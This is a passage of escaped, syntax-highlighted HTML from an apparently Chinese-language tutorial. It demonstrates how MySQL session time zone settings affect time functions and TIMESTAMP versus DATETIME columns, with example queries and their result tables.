class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e------------------+--------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eVariable_name\u003c/span\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eValue\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e------------------+--------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003esystem_time_zone\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCST\u003c/span\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eSYSTEM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e------------------+--------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"不同会话时区对-时间函数-的影响\"\u003e不同会话时区对 时间函数 的影响\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e当前时区\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e查看当前的全球和会话时区值\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e@@\u003c/span\u003e\u003cspan class=\"k\"\u003eGLOBAL\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e@@\u003c/span\u003e\u003cspan class=\"k\"\u003eSESSION\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eNOW\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCURDATE\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCURTIME\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eCURRENT_TIMESTAMP\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eset\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;America/New_York\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eNOW\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCURDATE\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCURTIME\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eCURRENT_TIMESTAMP\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"不同会话时区对-timestamp-类型的影响\"\u003e不同会话时区对 TIMESTAMP 类型的影响\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eUTC\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eset\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Asia/Shanghai\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eCREATE\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eTABLE\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevents\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003eINT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eAUTO_INCREMENT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ePRIMARY\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eKEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_name\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003eVARCHAR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e255\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eNOT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_timestamp\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eTIMESTAMP\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eDEFAULT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eCURRENT_TIMESTAMP\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_datetime\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eDATETIME\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eDEFAULT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eCURRENT_TIMESTAMP\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eINSERT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eINTO\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevents\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eevent_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_timestamp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_datetime\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eVALUES\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;10.24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2022-10-24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2022-10-24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eINSERT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eINTO\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevents\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eevent_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_timestamp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_datetime\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eVALUES\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;12.24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2022-12-24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2022-12-24 15:45:00\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevents\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_name\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_timestamp\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_datetime\u003c/span\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003erows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ein\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eset\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003esec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e仅修改当前会话的时区\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eset\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;America/New_York\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevents\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 